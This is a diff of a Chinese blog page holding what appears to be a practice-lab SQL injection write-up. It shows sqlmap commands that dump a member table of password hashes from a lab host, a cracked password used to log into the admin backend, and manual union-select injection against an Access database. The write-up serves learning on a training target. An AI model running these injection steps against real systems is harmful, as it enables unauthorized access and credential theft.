@@ -81,20 +81,19 @@
 
 
 
-<meta name="description" content="基于sql的盲注之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用虽然这">
+<meta name="description" content="基于sql的盲注 之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用 虽">
 <meta name="keywords" content="ctf,wp">
 <meta property="og:type" content="article">
 <meta property="og:title" content="两道sql注入题">
 <meta property="og:url" content="https://prontosil.club/2019/07/15/两道sql注入题/index.html">
 <meta property="og:site_name" content="prontosil">
-<meta property="og:description" content="基于sql的盲注之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用虽然这">
+<meta property="og:description" content="基于sql的盲注 之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用 虽">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://i.imgur.com/8EdgoS3.png">
 <meta property="og:image" content="https://i.imgur.com/JqIhPQS.png">
 <meta property="og:image" content="https://i.imgur.com/qNL5qbg.png">
 <meta property="og:image" content="https://i.imgur.com/nd1VTmg.png">
-<meta property="og:image" content="https://i.imgur.com/iRvoAHX.
-![password](https://i.imgur.com/B6oLiAA.png">
+<meta property="og:image" content="https://i.imgur.com/B6oLiAA.png">
 <meta property="og:image" content="https://i.imgur.com/6KXMijL.png">
 <meta property="og:image" content="https://i.imgur.com/yxq3qQi.png">
 <meta property="og:image" content="https://i.imgur.com/UmyBe7l.png">
@@ -103,7 +102,7 @@
 <meta property="og:updated_time" content="2019-07-22T05:25:59.913Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="两道sql注入题">
-<meta name="twitter:description" content="基于sql的盲注之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用虽然这">
+<meta name="twitter:description" content="基于sql的盲注 之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式  可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &amp;quot;post.txt&amp;quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &amp;quot;url&amp;quot; --forms 指定参数  趁机学到了一把sqlmap使用 虽">
 <meta name="twitter:image" content="https://i.imgur.com/8EdgoS3.png">
 
 
@@ -411,7 +410,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  425
+                  434
                 </span>
               
 
@@ -448,33 +447,55 @@
       
 
       
-        <h1 id="基于sql的盲注"><a href="#基于sql的盲注" class="headerlink" title="基于sql的盲注"></a>基于sql的盲注</h1><p>之前一直没有好好地学习过<code>sqlmap</code>的使用方法</p>
+        <h1>基于sql的盲注</h1>
+<p>之前一直没有好好地学习过<code>sqlmap</code>的使用方法</p>
 <p>如果是针对post表单这种方式</p>
 <ol>
 <li>可以将抓到的包保存成一个文件，然后使用 <code>sqlmap.py -r &quot;post.txt&quot; -p n --dbs</code> 其中<code>-p</code>是指定参数</li>
 <li>sqlmap也可以自动搜寻表单<code>sqlmap.py -u &quot;url&quot; --forms</code></li>
 <li>指定参数</li>
 </ol>
-<p>趁机学到了一把<code>sqlmap</code>使用<br>虽然这个题目是有点。。<br>但是注入点的判断也是很重要的</p>
-<h2 id="爆后端数据库"><a href="#爆后端数据库" class="headerlink" title="爆后端数据库"></a>爆后端数据库</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot;</code></p>
+<p>趁机学到了一把<code>sqlmap</code>使用
+虽然这个题目是有点。。
+但是注入点的判断也是很重要的</p>
+<h2>爆后端数据库</h2>
+<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot;</code></p>
 <p><img src="https://i.imgur.com/8EdgoS3.png" alt="backdatabase"></p>
-<h2 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs</code></p>
+<h2>爆数据库</h2>
+<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs</code></p>
 <p><img src="https://i.imgur.com/JqIhPQS.png" alt="database"></p>
-<h2 id="指定数据库报表爆表"><a href="#指定数据库报表爆表" class="headerlink" title="指定数据库报表爆表"></a>指定数据库报表爆表</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables</code></p>
+<h2>指定数据库报表爆表</h2>
+<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables</code></p>
 <p><img src="https://i.imgur.com/qNL5qbg.png" alt="table"></p>
-<h2 id="指定数据库和表爆字段"><a href="#指定数据库和表爆字段" class="headerlink" title="指定数据库和表爆字段"></a>指定数据库和表爆字段</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns</code></p>
+<h2>指定数据库和表爆字段</h2>
+<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns</code></p>
 <p><img src="https://i.imgur.com/nd1VTmg.png" alt="column"></p>
-<h2 id="指定数据库，表，字符然后dump出数据"><a href="#指定数据库，表，字符然后dump出数据" class="headerlink" title="指定数据库，表，字符然后dump出数据"></a>指定数据库，表，字符然后dump出数据</h2><p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump</code><br><img src="https://i.imgur.com/iRvoAHX.
-![password](https://i.imgur.com/B6oLiAA.png" alt="member"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: stormgroup</span><br><span class="line">Table: member</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| name  | password                         | status |</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0      |</span><br><span class="line">| mozhe | b7a0bebf8287c87253fb2958a390346a | 1      |</span><br><span class="line">+-------+----------------------------------+--------+</span><br></pre></td></tr></table></figure></p>
-<p>解密之后是106370<br>这样就能登陆后台了<br><img src="https://i.imgur.com/6KXMijL.png" alt="houtai"><br><img src="https://i.imgur.com/yxq3qQi.png" alt="key0"><br>太神奇了</p>
-<p>参考<br><a href="https://blog.csdn.net/u011781521/article/details/58594941" target="_blank" rel="noopener">sqlmap之(六)——POST登陆框注入实战</a></p>
-<h1 id="SQL手工注入漏洞测试-Access数据库"><a href="#SQL手工注入漏洞测试-Access数据库" class="headerlink" title="SQL手工注入漏洞测试(Access数据库)"></a>SQL手工注入漏洞测试(Access数据库)</h1><p>这道题目就有点神奇了</p>
+<h2>指定数据库，表，字符然后dump出数据</h2>
+<p><code>python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump</code>
+![member](https://i.imgur.com/iRvoAHX.
+<img src="https://i.imgur.com/B6oLiAA.png" alt="password">
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: stormgroup</span><br><span class="line">Table: member</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| name  | password                         | status |</span><br><span class="line">+-------+----------------------------------+--------+</span><br><span class="line">| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0      |</span><br><span class="line">| mozhe | b7a0bebf8287c87253fb2958a390346a | 1      |</span><br><span class="line">+-------+----------------------------------+--------+</span><br></pre></td></tr></table></figure></p>
+<p>解密之后是106370
+这样就能登陆后台了
+<img src="https://i.imgur.com/6KXMijL.png" alt="houtai">
+<img src="https://i.imgur.com/yxq3qQi.png" alt="key0">
+太神奇了</p>
+<p>参考
+<a href="https://blog.csdn.net/u011781521/article/details/58594941" target="_blank" rel="noopener">sqlmap之(六)----POST登陆框注入实战</a></p>
+<h1>SQL手工注入漏洞测试(Access数据库)</h1>
+<p>这道题目就有点神奇了</p>
 <p>纯靠猜</p>
 <p><code>order by 4</code>判断有多少个字段</p>
 <p>然后 <code>new_list.asp?id=1 and exists(select * from admin)</code>判断是否存在<code>admin</code></p>
-<p><img src="https://i.imgur.com/UmyBe7l.png" alt="access0"><br>接下来判断回显位置<br><code>/new_list.asp?id=1 union select 1,2,3,4 from admin</code></p>
-<p><img src="https://i.imgur.com/eyqGQZO.png" alt="access1"><br>接下来猜测字段值<br><code>and exists (select id from admin)</code></p>
-<p>爆出字段值<br><code>union select 1,username,passwd,id from admin</code><br><img src="https://i.imgur.com/H5rq91S.png" alt="access2"></p>
+<p><img src="https://i.imgur.com/UmyBe7l.png" alt="access0">
+接下来判断回显位置
+<code>/new_list.asp?id=1 union select 1,2,3,4 from admin</code></p>
+<p><img src="https://i.imgur.com/eyqGQZO.png" alt="access1">
+接下来猜测字段值
+<code>and exists (select id from admin)</code></p>
+<p>爆出字段值
+<code>union select 1,username,passwd,id from admin</code>
+<img src="https://i.imgur.com/H5rq91S.png" alt="access2"></p>
 <p>md5解密一下登陆就行了</p>
 <p><a href="https://blog.csdn.net/qq_39936434/article/details/94718134" target="_blank" rel="noopener">参考</a></p>
 
@@ -666,12 +687,6 @@
                         <i class="fa fa-fw fa-globe"></i>知乎</a>
                   </span>
                 
-                  <span class="links-of-author-item">
-                    <a href="https://stackoverflow.com/users/story/10970029" target="_blank" title="StackOverflow">
-                      
-                        <i class="fa fa-fw fa-stack-overflow"></i>StackOverflow</a>
-                  </span>
-                
             </div>
           
 
@@ -688,7 +703,11 @@
               <ul class="links-of-blogroll-list">
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://blog.szfszf.top/" title="Title" target="_blank">Title</a>
+                    <a href="https://blog.szfszf.top/" title="zsfnb!" target="_blank">zsfnb!</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://stackexit.cn/?tdsourcetag=s_pctim_aiomsg" title="xggnb!" target="_blank">xggnb!</a>
                   </li>
                 
               </ul>
@@ -697,7 +716,7 @@
 
           
 
-          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=471420725&auto=1&height=66"></iframe>
+         
         </div>
       </section>
 
@@ -711,7 +730,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基于sql的盲注"><span class="nav-number">1.</span> <span class="nav-text">基于sql的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#爆后端数据库"><span class="nav-number">1.1.</span> <span class="nav-text">爆后端数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆数据库"><span class="nav-number">1.2.</span> <span class="nav-text">爆数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指定数据库报表爆表"><span class="nav-number">1.3.</span> <span class="nav-text">指定数据库报表爆表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指定数据库和表爆字段"><span class="nav-number">1.4.</span> <span class="nav-text">指定数据库和表爆字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指定数据库，表，字符然后dump出数据"><span class="nav-number">1.5.</span> <span class="nav-text">指定数据库，表，字符然后dump出数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL手工注入漏洞测试-Access数据库"><span class="nav-number">2.</span> <span class="nav-text">SQL手工注入漏洞测试(Access数据库)</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">基于sql的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.1.</span> <span class="nav-text">爆后端数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.2.</span> <span class="nav-text">爆数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.3.</span> <span class="nav-text">指定数据库报表爆表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.4.</span> <span class="nav-text">指定数据库和表爆字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number">1.5.</span> <span class="nav-text">指定数据库，表，字符然后dump出数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">SQL手工注入漏洞测试(Access数据库)</span></a></li></ol></div>
             
 
           </div>
